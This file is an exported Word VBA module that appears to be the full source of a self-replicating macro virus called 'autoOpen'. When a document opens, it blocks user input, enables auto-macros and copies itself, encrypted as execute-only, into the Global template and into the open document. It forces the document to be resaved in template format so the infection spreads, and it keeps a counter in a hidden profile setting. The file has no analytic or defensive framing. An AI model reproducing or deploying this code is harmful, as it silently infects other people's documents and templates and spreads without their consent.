   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Dim MacDoc$
   Dim Status

   Public Sub MAIN()
   Dim JAkses$
   Dim Bcopytoall
   Dim Jopen
   MacDoc$ = ""
   Status = 0
   WordBasic.DisableInput (1)
   WordBasic.DisableAutoMacros (0)
   On Error GoTo -1: On Error GoTo finish
   MacDoc$ = WordBasic.[MacroFileName$]()
   CopyToGlobal
   If Status <> 0 Then CopyToFile
   JAkses$ = WordBasic.[GetProfileString$](" Compatibility ", "NPad328")
   Bcopytoall = WordBasic.Val(JAkses$)
   If Bcopytoall < 23 Then Jopen = Bcopytoall + 1
   If Bcopytoall = 23 Then Jopen = 0
   JAkses$ = Str(Jopen)
   WordBasic.SetProfileString "Compatibility", "NPad328", JAkses$
   finish:
   End Sub

   Private Sub CopyToGlobal()
   Dim MacVir$
   Dim Encrypt
      On Error GoTo -1: On Error GoTo finish
      MacVir$ = MacDoc$ + ":autoOpen"
      Encrypt = WordBasic.IsExecuteOnly(MacVir$)
      If Encrypt <> 0 Then
        WordBasic.MacroCopy MacVir$, "Global:autoOpen", 1
      End If
   finish:
      If Encrypt = 0 Then Status = 1
      If Encrypt <> 0 Then Status = Err.Number
   End Sub

   Private Sub CopyToFile()
   Dim DocFormat
   Dim MacVir$
   Dim MacTDoc$
   Dim Encrypt
      On Error GoTo -1: On Error GoTo finish
      Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
      WordBasic.CurValues.FileSaveAs dlg
      DocFormat = dlg.Format
      If DocFormat > 1 Then GoTo finish
      MacVir$ = MacDoc$ + ":autoOpen"
      MacTDoc$ = WordBasic.[FileName$]() + ":autoOpen"
      If DocFormat <> 1 Then WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
      Encrypt = WordBasic.IsExecuteOnly(MacVir$)
      If Encrypt <> 0 Then
        WordBasic.MacroCopy MacVir$, MacTDoc$, 1
        WordBasic.FileSave
      End If
   finish:
   End Sub
